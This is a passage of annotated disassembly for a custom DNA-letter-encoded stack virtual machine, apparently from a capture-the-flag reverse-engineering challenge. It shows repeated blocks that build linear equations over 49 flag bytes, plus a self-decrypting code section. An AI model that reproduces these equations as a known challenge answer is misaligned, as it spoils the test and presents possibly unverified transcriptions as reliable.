push(pop() * pop())\n0340a : GAGAGGGAAAAA     push(mem[#02a2])\n03416 : AATATAAAAAAA     push(#00000011)\n03422 : GT               push(pop() * pop())\n03424 : GACAGGGAAAAA     push(mem[#02a3])\n03430 : AAGCAGAAAAAA     push(#0000008e)\n0343c : GT               push(pop() * pop())\n0343e : GAATGGGAAAAA     push(mem[#02a4])\n0344a : AAGCCGAAAAAA     push(#000000be)\n03456 : GT               push(pop() * pop())\n03458 : GATTGGGAAAAA     push(mem[#02a5])\n03464 : AAGGCTAAAAAA     push(#0000007a)\n03470 : GT               push(pop() * pop())\n03472 : GAGTGGGAAAAA     push(mem[#02a6])\n0347e : AACCGTAAAAAA     push(#0000006f)\n0348a : GT               push(pop() * pop())\n0348c : GACTGGGAAAAA     push(mem[#02a7])\n03498 : AAGCGTAAAAAA     push(#0000006e)\n034a4 : GT               push(pop() * pop())\n034a6 : GAAGGGGAAAAA     push(mem[#02a8])\n034b2 : AAAATAAAAAAA     push(#00000010)\n034be : GT               push(pop() * pop())\n034c0 : GATGGGGAAAAA     push(mem[#02a9])\n034cc : AAACCAAAAAAA     push(#0000003c)\n034d8 : GT               push(pop() * pop())\n034da : GAGGGGGAAAAA     push(mem[#02aa])\n034e6 : AAGAAGAAAAAA     push(#00000082)\n034f2 : GT               push(pop() * pop())\n034f4 : GACGGGGAAAAA     push(mem[#02ab])\n03500 : AACATGAAAAAA     push(#00000093)\n0350c : GT               push(pop() * pop())\n0350e : GAACGGGAAAAA     push(mem[#02ac])\n0351a : AAATCGAAAAAA     push(#000000b4)\n03526 : GT               push(pop() * pop())\n03528 : GATCGGGAAAAA     push(mem[#02ad])\n03534 : AAGTATAAAAAA     push(#00000046)\n03540 : GT               push(pop() * pop())\n03542 : GAGCGGGAAAAA     push(mem[#02ae])\n0354e : AAAGACAAAAAA     push(#000000c8)\n0355a : GT               push(pop() * pop())\n0355c : GACCGGGAAAAA     push(mem[#02af])\n03568 : AACTATAAAAAA     push(#00000047)\n03574 : GT               push(pop() * pop())\n03576 : GAAACGGAAAAA     push(mem[#02b0])\n03582 : AACTGAAAAAAA     push(#00000027)\n0358e : GT               push(pop() * pop())\n03590 : AT               push(pop() + pop())\n03592 : AT               push(pop() + pop())\n03594 : AT               push(pop() + pop())\n03596 : AT               push(pop() + pop())\n03598 : AT               push(pop() + pop())\n0359a : AT               push(pop() + pop())\n0359c : AT               push(pop() + pop())\n0359e : AT               push(pop() + pop())\n035a0 : AT               push(pop() + pop())\n035a2 : AT               push(pop() + pop())\n035a4 : AT               push(pop() + pop())\n035a6 : AT               push(pop() + pop())\n035a8 : AT               push(pop() + pop())\n035aa : AT               push(pop() + pop())\n035ac : AT               push(pop() + pop())\n035ae : AT               push(pop() + pop())\n035b0 : AT               push(pop() + pop())\n035b2 : AT               push(pop() + pop())\n035b4 : AT               push(pop() + pop())\n035b6 : AT               push(pop() + pop())\n035b8 : AT               push(pop() + pop())\n035ba : AT               push(pop() + pop())\n035bc : AT               push(pop() + pop())\n035be : AT               push(pop() + pop())\n035c0 : AT               push(pop() + pop())\n035c2 : AT               push(pop() + pop())\n035c4 : AT               push(pop() + pop())\n035c6 : AT               push(pop() + pop())\n035c8 : AT               push(pop() + pop())\n035ca : AT               push(pop() + pop())\n035cc : AT               push(pop() + pop())\n035ce : AT               push(pop() + pop())\n035d0 : AT               push(pop() + pop())\n035d2 : AT               push(pop() + pop())\n035d4 : AT               push(pop() + pop())\n035d6 : AT               push(pop() + pop())\n035d8 : AT               push(pop() + pop())\n035da : AT               push(pop() + pop())\n035dc : AT               push(pop() + pop())\n035de : AT               push(pop() + pop())\n035e0 : AT               push(pop() + pop())\n035e2 : AT               push(pop() + pop())\n035e4 : AT               push(pop() + pop())\n035e6 : AT               push(pop() + pop())\n035e8 : AT               push(pop() + pop())\n035ea : AT               push(pop() + pop())\n035ec : AT               push(pop() + pop())\n035ee : AT               push(pop() + pop())\n035f0 : CAATGAAATAAA     mem[#1024] := pop()           memory[#01024] := ((flag[0] * 253) + ((flag[1] * 185) + ((flag[2] * 175) + ((flag[3] * 59) + ((flag[4] * 219) + ((flag[5] * 231) + ((flag[6] * 246) + ((flag[7] * 46) + ((flag[8] * 101) + ((flag[9] * 95) + ((flag[10] * 237) + ((flag[11] * 171) + ((flag[12] * 242) + ((flag[13] * 134) + ((flag[14] * 95) + ((flag[15] * 152) + ((flag[16] * 121) + ((flag[17] * 232) + ((flag[18] * 43) + ((flag[19] * 50) + ((flag[20] * 135) + ((flag[21] * 70) + ((flag[22] * 144) + ((flag[23] * 122) + ((flag[24] * 118) + ((flag[25] * 75) + ((flag[26] * 138) + ((flag[27] * 57) + ((flag[28] * 120) + ((flag[29] * 120) + ((flag[30] * 198) + ((flag[31] * 38) + ((flag[32] * 202) + ((flag[33] * 51) + ((flag[34] * 17) + ((flag[35] * 142) + ((flag[36] * 190) + ((flag[37] * 122) + ((flag[38] * 111) + ((flag[39] * 110) + ((flag[40] * 16) + ((flag[41] * 60) + ((flag[42] * 130) + ((flag[43] * 147) + ((flag[44] * 180) + ((flag[45] * 70) + ((flag[46] * 200) + ((flag[47] * 71) + (flag[48] * 39)))))))))))))))))))))))))))))))))))))))))))))))))\n035fc : GAAAAGGAAAAA     push(mem[#0280])\n03608 : AACCTAAAAAAA     push(#0000001f)\n03614 : GT               push(pop() * pop())\n03616 : GATAAGGAAAAA     push(mem[#0281])\n03622 : AAAGCAAAAAAA     push(#00000038)\n0362e : GT               push(pop() * pop())\n03630 : GAGAAGGAAAAA     push(mem[#0282])\n0363c : AAAGTCAAAAAA     push(#000000d8)\n03648 : GT               push(pop() * pop())\n0364a : GACAAGGAAAAA     push(mem[#0283])\n03656 : AAGGCGAAAAAA     push(#000000ba)\n03662 : GT               push(pop() * pop())\n03664 : GAATAGGAAAAA     push(mem[#0284])\n03670 : AAAGAAAAAAAA     push(#00000008)\n0367c : GT               push(pop() * pop())\n0367e : GATTAGGAAAAA     push(mem[#0285])\n0368a : AAGAGGAAAAAA     push(#000000a2)\n03696 : GT               push(pop() * pop())\n03698 : GAGTAGGAAAAA     push(mem[#0286])\n036a4 : AAACCCAAAAAA     push(#000000fc)\n036b0 : GT               push(pop() * pop())\n036b2 : GACTAGGAAAAA     push(mem[#0287])\n036be : AATCTGAAAAAA     push(#0000009d)\n036ca : GT               push(pop() * pop())\n036cc : GAAGAGGAAAAA     push(mem[#0288])\n036d8 : AAAGAGAAAAAA     push(#00000088)\n036e4 : GT               push(pop() * pop())\n036e6 : GATGAGGAAAAA     push(mem[#0289])\n036f2 : AATTCTAAAAAA     push(#00000075)\n036fe : GT               push(pop() * pop())\n03700 : GAGGAGGAAAAA     push(mem[#028a])\n0370c : AAGCCCAAAAAA     push(#000000fe)\n03718 : GT               push(pop() * pop())\n0371a : GACGAGGAAAAA     push(mem[#028b])\n03726 : AAACCGAAAAAA     push(#000000bc)\n03732 : GT               push(pop() * pop())\n03734 : GAACAGGAAAAA     push(mem[#028c])\n03740 : AAAGATAAAAAA     push(#00000048)\n0374c : GT               push(pop() * pop())\n0374e : GATCAGGAAAAA     push(mem[#028d])\n0375a : AATACTAAAAAA     push(#00000071)\n03766 : GT               push(pop() * pop())\n03768 : GAGCAGGAAAAA     push(mem[#028e])\n03774 : AATGTGAAAAAA     push(#00000099)\n03780 : GT               push(pop() * pop())\n03782 : GACCAGGAAAAA     push(mem[#028f])\n0378e : AACTAGAAAAAA     push(#00000087)\n0379a : GT               push(pop() * pop())\n0379c : GAAATGGAAAAA     push(mem[#0290])\n037a8 : AAGGTCAAAAAA     push(#000000da)\n037b4 : GT               push(pop() * pop())\n037b6 : GATATGGAAAAA     push(mem[#0291])\n037c2 : AACTGTAAAAAA     push(#00000067)\n037ce : GT               push(pop() * pop())\n037d0 : GAGATGGAAAAA     push(mem[#0292])\n037dc : AAATGCAAAAAA     push(#000000e4)\n037e8 : GT               push(pop() * pop())\n037ea : GACATGGAAAAA     push(mem[#0293])\n037f6 : AACGTTAAAAAA     push(#0000005b)\n03802 : GT               push(pop() * pop())\n03804 : GAATTGGAAAAA     push(mem[#0294])\n03810 : AACAGTAAAAAA     push(#00000063)\n0381c : GT               push(pop() * pop())\n0381e : GATTTGGAAAAA     push(mem[#0295])\n0382a : AAGGGCAAAAAA     push(#000000ea)\n03836 : GT               push(pop() * pop())\n03838 : GAGTTGGAAAAA     push(mem[#0296])\n03844 : AATGCCAAAAAA     push(#000000f9)\n03850 : GT               push(pop() * pop())\n03852 : GACTTGGAAAAA     push(mem[#0297])\n0385e : AAAATGAAAAAA     push(#00000090)\n0386a : GT               push(pop() * pop())\n0386c : GAAGTGGAAAAA     push(mem[#0298])\n03878 : AACGGCAAAAAA     push(#000000eb)\n03884 : GT               push(pop() * pop())\n03886 : GATGTGGAAAAA     push(mem[#0299])\n03892 : AAGTATAAAAAA     push(#00000046)\n0389e : GT               push(pop() * pop())\n038a0 : GAGGTGGAAAAA     push(mem[#029a])\n038ac : AATATAAAAAAA     push(#00000011)\n038b8 : GT               push(pop() * pop())\n038ba : GACGTGGAAAAA     push(mem[#029b])\n038c6 : AAGTTTAAAAAA     push(#00000056)\n038d2 : GT               push(pop() * pop())\n038d4 : GAACTGGAAAAA     push(mem[#029c])\n038e0 : AATAGGAAAAAA     push(#000000a1)\n038ec : GT               push(pop() * pop())\n038ee : GATCTGGAAAAA     push(mem[#029d])\n038fa : AACCAGAAAAAA     push(#0000008f)\n03906 : GT               push(pop() * pop())\n03908 : GAGCTGGAAAAA     push(mem[#029e])\n03914 : AATACCAAAAAA     push(#000000f1)\n03920 : GT               push(pop() * pop())\n03922 : GACCTGGAAAAA     push(mem[#029f])\n0392e : AAGGGCAAAAAA     push(#000000ea)\n0393a : GT               push(pop() * pop())\n0393c : GAAAGGGAAAAA     push(mem[#02a0])\n03948 : AACTTTAAAAAA     push(#00000057)\n03954 : GT               push(pop() * pop())\n03956 : GATAGGGAAAAA     push(mem[#02a1])\n03962 : AAAGTGAAAAAA     push(#00000098)\n0396e : GT               push(pop() * pop())\n03970 : GAGAGGGAAAAA     push(mem[#02a2])\n0397c : AACTCCAAAAAA     push(#000000f7)\n03988 : GT               push(pop() * pop())\n0398a : GACAGGGAAAAA     push(mem[#02a3])\n03996 : AATCGTAAAAAA     push(#0000006d)\n039a2 : GT               push(pop() * pop())\n039a4 : GAATGGGAAAAA     push(mem[#02a4])\n039b0 : AAGGTGAAAAAA     push(#0000009a)\n039bc : GT               push(pop() * pop())\n039be : GATTGGGAAAAA     push(mem[#02a5])\n039ca : AACTGCAAAAAA     push(#000000e7)\n039d6 : GT               push(pop() * pop())\n039d8 : GAGTGGGAAAAA     push(mem[#02a6])\n039e4 : AATAACAAAAAA     push(#000000c1)\n039f0 : GT               push(pop() * pop())\n039f2 : GACTGGGAAAAA     push(mem[#02a7])\n039fe : AAAACAAAAAAA     push(#00000030)\n03a0a : GT               push(pop() * pop())\n03a0c : GAAGGGGAAAAA     push(mem[#02a8])\n03a18 : AAGCGGAAAAAA     push(#000000ae)\n03a24 : GT               push(pop() * pop())\n03a26 : GATGGGGAAAAA     push(mem[#02a9])\n03a32 : AATGGAAAAAAA     push(#00000029)\n03a3e : GT               push(pop() * pop())\n03a40 : GAGGGGGAAAAA     push(mem[#02aa])\n03a4c : AAGTCTAAAAAA     push(#00000076)\n03a58 : GT               push(pop() * pop())\n03a5a : GACGGGGAAAAA     push(mem[#02ab])\n03a66 : AACGAGAAAAAA     push(#0000008b)\n03a72 : GT               push(pop() * pop())\n03a74 : GAACGGGAAAAA     push(mem[#02ac])\n03a80 : AAATCCAAAAAA     push(#000000f4)\n03a8c : GT               push(pop() * pop())\n03a8e : GATCGGGAAAAA     push(mem[#02ad])\n03a9a : AACGGAAAAAAA     push(#0000002b)\n03aa6 : GT               push(pop() * pop())\n03aa8 : GAGCGGGAAAAA     push(mem[#02ae])\n03ab4 : AACACTAAAAAA     push(#00000073)\n03ac0 : GT               push(pop() * pop())\n03ac2 : GACCGGGAAAAA     push(mem[#02af])\n03ace : AATGGAAAAAAA     push(#00000029)\n03ada : GT               push(pop() * pop())\n03adc : GAAACGGAAAAA     push(mem[#02b0])\n03ae8 : AAGACAAAAAAA     push(#00000032)\n03af4 : GT               push(pop() * pop())\n03af6 : AT               push(pop() + pop())\n03af8 : AT               push(pop() + pop())\n03afa : AT               push(pop() + pop())\n03afc : AT               push(pop() + pop())\n03afe : AT               push(pop() + pop())\n03b00 : AT               push(pop() + pop())\n03b02 : AT               push(pop() + pop())\n03b04 : AT               push(pop() + pop())\n03b06 : AT               push(pop() + pop())\n03b08 : AT               push(pop() + pop())\n03b0a : AT               push(pop() + pop())\n03b0c : AT               push(pop() + pop())\n03b0e : AT               push(pop() + pop())\n03b10 : AT               push(pop() + pop())\n03b12 : AT               push(pop() + pop())\n03b14 : AT               push(pop() + pop())\n03b16 : AT               push(pop() + pop())\n03b18 : AT               push(pop() + pop())\n03b1a : AT               push(pop() + pop())\n03b1c : AT               push(pop() + pop())\n03b1e : AT               push(pop() + pop())\n03b20 : AT               push(pop() + pop())\n03b22 : AT               push(pop() + pop())\n03b24 : AT               push(pop() + pop())\n03b26 : AT               push(pop() + pop())\n03b28 : AT               push(pop() + pop())\n03b2a : AT               push(pop() + pop())\n03b2c : AT               push(pop() + pop())\n03b2e : AT               push(pop() + pop())\n03b30 : AT               push(pop() + pop())\n03b32 : AT               push(pop() + pop())\n03b34 : AT               push(pop() + pop())\n03b36 : AT               push(pop() + pop())\n03b38 : AT               push(pop() + pop())\n03b3a : AT               push(pop() + pop())\n03b3c : AT               push(pop() + pop())\n03b3e : AT               push(pop() + pop())\n03b40 : AT               push(pop() + pop())\n03b42 : AT               push(pop() + pop())\n03b44 : AT               push(pop() + pop())\n03b46 : AT               push(pop() + pop())\n03b48 : AT               push(pop() + pop())\n03b4a : AT               push(pop() + pop())\n03b4c : AT               push(pop() + pop())\n03b4e : AT               push(pop() + pop())\n03b50 : AT               push(pop() + pop())\n03b52 : AT               push(pop() + pop())\n03b54 : AT               push(pop() + pop())\n03b56 : CAAGGAAATAAA     mem[#1028] := pop()           memory[#01028] := ((flag[0] * 31) + ((flag[1] * 56) + ((flag[2] * 216) + ((flag[3] * 186) + ((flag[4] * 8) + ((flag[5] * 162) + ((flag[6] * 252) + ((flag[7] * 157) + ((flag[8] * 136) + ((flag[9] * 117) + ((flag[10] * 254) + ((flag[11] * 188) + ((flag[12] * 72) + ((flag[13] * 113) + ((flag[14] * 153) + ((flag[15] * 135) + ((flag[16] * 218) + ((flag[17] * 103) + ((flag[18] * 228) + ((flag[19] * 91) + ((flag[20] * 99) + ((flag[21] * 234) + ((flag[22] * 249) + ((flag[23] * 144) + ((flag[24] * 235) + ((flag[25] * 70) + ((flag[26] * 17) + ((flag[27] * 86) + ((flag[28] * 161) + ((flag[29] * 143) + ((flag[30] * 241) + ((flag[31] * 234) + ((flag[32] * 87) + ((flag[33] * 152) + ((flag[34] * 247) + ((flag[35] * 109) + ((flag[36] * 154) + ((flag[37] * 231) + ((flag[38] * 193) + ((flag[39] * 48) + ((flag[40] * 174) + ((flag[41] * 41) + ((flag[42] * 118) + ((flag[43] * 139) + ((flag[44] * 244) + ((flag[45] * 43) + ((flag[46] * 115) + ((flag[47] * 41) + (flag[48] * 50)))))))))))))))))))))))))))))))))))))))))))))))))\n03b62 : GAGGTGGAAAAA     push(mem[#029a])\n03b6e : TC               exec(pop())                   exec_decrypt(flag[26])\n      ; section at 03b70, coding: [1, 2, 3, 0]\n03b70 : TCCCCTTCCCCC     push(mem[#0280])\n03b7c : CCCGGCCCCCCC     push(#0000003c)\n03b88 : TA               push(pop() * pop())\n03b8a : TCACCTTCCCCC     push(mem[#0281])\n03b96 : CCGTTACCCCCC     push(#0000006b)\n03ba2 : TA               push(pop() * pop())\n03ba4 : TCTCCTTCCCCC     push(mem[#0282])\n03bb0 : CCCCTGCCCCCC     push(#000000e0)\n03bbc : TA               push(pop() * pop())\n03bbe : TCGCCTTCCCCC     push(mem[#0283])\n03bca : CCGATTCCCCCC     push(#000000a7)\n03bd6 : TA               push(pop() * pop())\n03bd8 : TCCACTTCCCCC     push(mem[#0284])\n03be4 : CCAAGCCCCCCC     push(#00000035)\n03bf0 : TA               push(pop() * pop())\n03bf2 : TCAACTTCCCCC     push(mem[#0285])\n03bfe : CCCCCACCCCCC     push(#00000040)\n03c0a : TA               push(pop() * pop())\n03c0c : TCTACTTCCCCC     push(mem[#0286])\n03c18 : CCGTGTCCCCCC     push(#000000bb)\n03c24 : TA               push(pop() * pop())\n03c26 : TCGACTTCCCCC     push(mem[#0287])\n03c32 : CCCAAGCCCCCC     push(#000000d4)\n03c3e : TA               push(pop() * pop())\n03c40 : TCCTCTTCCCCC     push(mem[#0288])\n03c4c : CCATGGCCCCCC     push(#000000f9)\n03c58 : TA               push(pop() * pop())\n03c5a : TCATCTTCCCCC     push(mem[#0289])\n03c66 : CCCCCACCCCCC     push(#00000040)\n03c72 : TA               push(pop() * pop())\n03c74 : TCTTCTTCCCCC     push(mem[#028a])\n03c80 : CCCCTCCCCCCC     push(#00000020)\n03c8c : TA               push(pop() * pop())\n03c8e : TCGTCTTCCCCC     push(mem[#028b])\n03c9a : CCAGTGCCCCCC     push(#000000ed)\n03ca6 : TA               push(pop() * pop())\n03ca8 : TCCGCTTCCCCC     push(mem[#028c])\n03cb4 : CCTCACCCCCCC     push(#00000012)\n03cc0 : TA               push(pop() * pop())\n03cc2 : TCAGCTTCCCCC     push(mem[#028d])\n03cce : CCGTATCCCCCC     push(#0000009b)\n03cda : TA               push(pop() * pop())\n03cdc : TCTGCTTCCCCC     push(mem[#028e])\n03ce8 : CCTCCGCCCCCC     push(#000000c2)\n03cf4 : TA               push(pop() * pop())\n03cf6 : TCGGCTTCCCCC     push(mem[#028f])\n03d02 : CCGAAGCCCCCC     push(#000000d7)\n03d0e : TA               push(pop() * pop())\n03d10 : TCCCATTCCCCC     push(mem[#0290])\n03d1c : CCGGCCCCCCCC     push(#0000000f)\n03d28 : TA               push(pop() * pop())\n03d2a : TCACATTCCCCC     push(mem[#0291])\n03d36 : CCACCCCCCCCC     push(#00000001)\n03d42 : TA               push(pop() * pop())\n03d44 : TCTCATTCCCCC     push(mem[#0292])\n03d50 : CCTGACCCCCCC     push(#0000001e)\n03d5c : TA               push(pop() * pop())\n03d5e : TCGCATTCCCCC     push(mem[#0293])\n03d6a : CCGGTGCCCCCC     push(#000000ef)\n03d76 : TA               push(pop() * pop())\n03d78 : TCCAATTCCCCC     push(mem[#0294])\n03d84 : CCGCTTCCCCCC     push(#000000a3)\n03d90 : TA               push(pop() * pop())\n03d92 : TCAAATTCCCCC     push(mem[#0295])\n03d9e : CCACTGCCCCCC     push(#000000e1)\n03daa : TA               push(pop() * pop())\n03dac : TCTAATTCCCCC     push(mem[#0296])\n03db8 : CCACTTCCCCCC     push(#000000a1)\n03dc4 : TA               push(pop() * pop())\n03dc6 : TCGAATTCCCCC     push(mem[#0297])\n03dd2 : CCGAAACCCCCC     push(#00000057)\n03dde : TA               push(pop() * pop())\n03de0 : TCCTATTCCCCC     push(mem[#0298])\n03dec : CCCATGCCCCCC     push(#000000e4)\n03df8 : TA               push(pop() * pop())\n03dfa : TCATATTCCCCC     push(mem[#0299])\n03e06 : CCACGACCCCCC     push(#00000071)\n03e12 : TA               push(pop() * pop())\n03e14 : TCTTATTCCCCC     push(mem[#029a])\n03e20 : CCGACACCCCCC     push(#00000047)\n03e2c : TA               push(pop() * pop())\n03e2e : TCGTATTCCCCC     push(mem[#029b])\n03e3a : CCATATCCCCCC     push(#00000099)\n03e46 : TA               push(pop() * pop())\n03e48 : TCCGATTCCCCC     push(mem[#029c])\n03e54 : CCGAGTCCCCCC     push(#000000b7)\n03e60 : TA               push(pop() * pop())\n03e62 : TCAGATTCCCCC     push(mem[#029d])\n03e6e : CCTGGCCCCCCC     push(#0000003e)\n03e7a : TA               push(pop() * pop())\n03e7c : TCTGATTCCCCC     push(mem[#029e])\n03e88 : CCTCATCCCCCC     push(#00000092)\n03e94 : TA               push(pop() * pop())\n03e96 : TCGGATTCCCCC     push(mem[#029f])\n03ea2 : CCTAGCCCCCCC     push(#00000036)\n03eae : TA               push(pop() * pop())\n03eb0 : TCCCTTTCCCCC     push(mem[#02a0])\n03ebc : CCGATGCCCCCC     push(#000000e7)\n03ec8 : TA               push(pop() * pop())\n03eca : TCACTTTCCCCC     push(mem[#02a1])\n03ed6 : CCATCGCCCCCC     push(#000000c9)\n03ee2 : TA               push(pop() * pop())\n03ee4 : TCTCTTTCCCCC     push(mem[#02a2])\n03ef0 : CCCTGCCCCCCC     push(#00000038)\n03efc : TA               push(pop() * pop())\n03efe : TCGCTTTCCCCC     push(mem[#02a3])\n03f0a : CCCGGGCCCCCC     push(#000000fc)\n03f16 : TA               push(pop() * pop())\n03f18 : TCCATTTCCCCC     push(mem[#02a4])\n03f24 : CCCCGACCCCCC     push(#00000070)\n03f30 : TA               push(pop() * pop())\n03f32 : TCAATTTCCCCC     push(mem[#02a5])\n03f3e : CCTCCTCCCCCC     push(#00000082)\n03f4a : TA               push(pop() * pop())\n03f4c : TCTATTTCCCCC     push(mem[#02a6])\n03f58 : CCCCAGCCCCCC     push(#000000d0)\n03f64 : TA               push(pop() * pop())\n03f66 : TCGATTTCCCCC     push(mem[#02a7])\n03f72 : CCAGCGCCCCCC     push(#000000cd)\n03f7e : TA               push(pop() * pop())\n03f80 : TCCTTTTCCCCC     push(mem[#02a8])\n03f8c : CCGTCCCCCCCC     push(#0000000b)\n03f98 : TA               push(pop() * pop())\n03f9a : TCATTTTCCCCC     push(mem[#02a9])\n03fa6 : CCGGGGCCCCCC     push(#000000ff)\n03fb2 : TA               push(pop() * pop())\n03fb4 : TCTTTTTCCCCC     push(mem[#02aa])\n03fc0 : CCGTAACCCCCC     push(#0000005b)\n03fcc : TA               push(pop() * pop())\n03fce : TCGTTTTCCCCC     push(mem[#02ab])\n03fda : CCGACCCCCCCC     push(#00000007)\n03fe6 : TA               push(pop() * pop())\n03fe8 : TCCGTTTCCCCC     push(mem[#02ac])\n03ff4 : CCTCGACCCCCC     push(#00000072)\n04000 : TA               push(pop() * pop())\n04002 : TCAGTTTCCCCC     push(mem[#02ad])\n0400e : CCGTAACCCCCC     push(#0000005b)\n0401a : TA               push(pop() * pop())\n0401c : TCTGTTTCCCCC     push(mem[#02ae])\n04028 : CCGGTTCCCCCC     push(#000000af)\n04034 : TA               push(pop() * pop())\n04036 : TCGGTTTCCCCC     push(mem[#02af])\n04042 : CCTAGGCCCCCC     push(#000000f6)\n0404e : TA               push(pop() * pop())\n04050 : TCCCGTTCCCCC     push(mem[#02b0])\n0405c : CCAATCCCCCCC     push(#00000025)\n04068 : TA               push(pop() * pop())\n0406a : CA               push(pop() + pop())\n0406c : CA               push(pop() + pop())\n0406e : CA               push(pop() + pop())\n04070 : CA               push(pop() + pop())\n04072 : CA               push(pop() + pop())\n04074 : CA               push(pop() + pop())\n04076 : CA               push(pop() + pop())\n04078 : CA               push(pop() + pop())\n0407a : CA               push(pop() + pop())\n0407c : CA               push(pop() + pop())\n0407e : CA               push(pop() + pop())\n04080 : CA               push(pop() + pop())\n04082 : CA               push(pop() + pop())\n04084 : CA               push(pop() + pop())\n04086 : CA               push(pop() + pop())\n04088 : CA               push(pop() + pop())\n0408a : CA               push(pop() + pop())\n0408c : CA               push(pop() + pop())\n0408e : CA               push(pop() + pop())\n04090 : CA               push(pop() + pop())\n04092 : CA               push(pop() + pop())\n04094 : CA               push(pop() + pop())\n04096 : CA               push(pop() + pop())\n04098 : CA               push(pop() + pop())\n0409a : CA               push(pop() + pop())\n0409c : CA               push(pop() + pop())\n0409e : CA               push(pop() + pop())\n040a0 : CA               push(pop() + pop())\n040a2 : CA               push(pop() + pop())\n040a4 : CA               push(pop() + pop())\n040a6 : CA               push(pop() + pop())\n040a8 : CA               push(pop() + pop())\n040aa : CA               push(pop() + pop())\n040ac : CA               push(pop() + pop())\n040ae : CA               push(pop() + pop())\n040b0 : CA               push(pop() + pop())\n040b2 : CA               push(pop() + pop())\n040b4 : CA               push(pop() + pop())\n040b6 : CA               push(pop() + pop())\n040b8 : CA               push(pop() + pop())\n040ba : CA               push(pop() + pop())\n040bc : CA               push(pop() + pop())\n040be : CA               push(pop() + pop())\n040c0 : CA               push(pop() + pop())\n040c2 : CA               push(pop() + pop())\n040c4 : CA               push(pop() + pop())\n040c6 : CA               push(pop() + pop())\n040c8 : CA               push(pop() + pop())\n040ca : GCCGTCCCACCC     mem[#102c] := pop()           memory[#0102c] := ((flag[0] * 60) + ((flag[1] * 107) + ((flag[2] * 224) + ((flag[3] * 167) + ((flag[4] * 53) + ((flag[5] * 64) + ((flag[6] * 187) + ((flag[7] * 212) + ((flag[8] * 249) + ((flag[9] * 64) + ((flag[10] * 32) + ((flag[11] * 237) + ((flag[12] * 18) + ((flag[13] * 155) + ((flag[14] * 194) + ((flag[15] * 215) + ((flag[16] * 15) + ((flag[17] * 1) + ((flag[18] * 30) + ((flag[19] * 239) + ((flag[20] * 163) + ((flag[21] * 225) + ((flag[22] * 161) + ((flag[23] * 87) + ((flag[24] * 228) + ((flag[25] * 113) + ((flag[26] * 71) + ((flag[27] * 153) + ((flag[28] * 183) + ((flag[29] * 62) + ((flag[30] * 146) + ((flag[31] * 54) + ((flag[32] * 231) + ((flag[33] * 201) + ((flag[34] * 56) + ((flag[35] * 252) + ((flag[36] * 112) + ((flag[37] * 130) + ((flag[38] * 208) + ((flag[39] * 205) + ((flag[40] * 11) + ((flag[41] * 255) + ((flag[42] * 91) + ((flag[43] * 7) + ((flag[44] * 114) + ((flag[45] * 91) + ((flag[46] * 175) + ((flag[47] * 246) + (flag[48] * 37)))))))))))))))))))))))))))))))))))))))))))))))))\n040d6 : TCCCCTTCCCCC     push(mem[#0280])\n040e2 : CCGACTCCCCCC     push(#00000087)\n040ee : TA               push(pop() * pop())\n040f0 : TCACCTTCCCCC     push(mem[#0281])\n040fc : CCCCTACCCCCC     push(#00000060)\n04108 : TA               push(pop() * pop())\n0410a : TCTCCTTCCCCC     push(mem[#0282])\n04116 : CCTCCGCCCCCC     push(#000000c2)\n04122 : TA               push(pop() * pop())\n04124 : TCGCCTTCCCCC     push(mem[#0283])\n04130 : CCCGTACCCCCC     push(#0000006c)\n0413c : TA               push(pop() * pop())\n0413e : TCCACTTCCCCC     push(mem[#0284])\n0414a : CCACTACCCCCC     push(#00000061)\n04156 : TA               push(pop() * pop())\n04158 : TCAACTTCCCCC     push(mem[#0285])\n04164 : CCGGGTCCCCCC     push(#000000bf)\n04170 : TA               push(pop() * pop())\n04172 : TCTACTTCCCCC     push(mem[#0286])\n0417e : CCCAACCCCCCC     push(#00000014)\n0418a : TA               push(pop() * pop())\n0418c : TCGACTTCCCCC     push(mem[#0287])\n04198 : CCCGCTCCCCCC     push(#0000008c)\n041a4 : TA               push(pop() * pop())\n041a6 : TCCTCTTCCCCC     push(mem[#0288])\n041b2 : CCACGACCCCCC     push(#00000071)\n041be : TA               push(pop() * pop())\n041c0 : TCATCTTCCCCC     push(mem[#0289])\n041cc : CCGGGCCCCCCC     push(#0000003f)\n041d8 : TA               push(pop() * pop())\n041da : TCTTCTTCCCCC     push(mem[#028a])\n041e6 : CCACATCCCCCC     push(#00000091)\n041f2 : TA               push(pop() * pop())\n041f4 : TCGTCTTCCCCC     push(mem[#028b])\n04200 : CCACTACCCCCC     push(#00000061)\n0420c : TA               push(pop() * pop())\n0420e : TCCGCTTCCCCC     push(mem[#028c])\n0421a : CCAGAGCCCCCC     push(#000000dd)\n04226 : TA               push(pop() * pop())\n04228 : TCAGCTTCCCCC     push(mem[#028d])\n04234 : CCCATACCCCCC     push(#00000064)\n04240 : TA               push(pop() * pop())\n04242 : TCTGCTTCCCCC     push(mem[#028e])\n0424e : CCATAACCCCCC     push(#00000059)\n0425a : TA               push(pop() * pop())\n0425c : TCGGCTTCCCCC     push(mem[#028f])\n04268 : CCTATCCCCCCC     push(#00000026)\n04274 : TA               push(pop() * pop())\n04276 : TCCCATTCCCCC     push(mem[#0290])\n04282 : CCCTCCCCCCCC     push(#00000008)\n0428e : TA               push(pop() * pop())\n04290 : TCACATTCCCCC     push(mem[#0291])\n0429c : CCGGACCCCCCC     push(#0000001f)\n042a8 : TA               push(pop() * pop())\n042aa : TCTCATTCCCCC     push(mem[#0292])\n042b6 : CCGGTCCCCCCC     push(#0000002f)\n042c2 : TA               push(pop() * pop())\n042c4 : TCGCATTCCCCC     push(mem[#0293])\n042d0 : CCCACACCCCCC     push(#00000044)\n042dc : TA               push(pop() * pop())\n042de : TCCAATTCCCCC     push(mem[#0294])\n042ea : CCACTGCCCCCC     push(#000000e1)\n042f6 : TA               push(pop() * pop())\n042f8 : TCAAATTCCCCC     push(mem[#0295])\n04304 : CCTAGCCCCCCC     push(#00000036)\n04310 : TA               push(pop() * pop())\n04312 : TCTAATTCCCCC     push(mem[#0296])\n0431e : CCCGGACCCCCC     push(#0000007c)\n0432a : TA               push(pop() * pop())\n0432c : TCGAATTCCCCC     push(mem[#0297])\n04338 : CCCGCTCCCCCC     push(#0000008c)\n04344 : TA               push(pop() * pop())\n04346 : TCCTATTCCCCC     push(mem[#0298])\n04352 : CCGAAGCCCCCC     push(#000000d7)\n0435e : TA               push(pop() * pop())\n04360 : TCATATTCCCCC     push(mem[#0299])\n0436c : CCAGGTCCCCCC     push(#000000bd)\n04378 : TA               push(pop() * pop())\n0437a : TCTTATTCCCCC     push(mem[#029a])\n04386 : CCGATTCCCCCC     push(#000000a7)\n04392 : TA               push(pop() * pop())\n04394 : TCGTATTCCCCC     push(mem[#029b])\n043a0 : CCTCAGCCCCCC     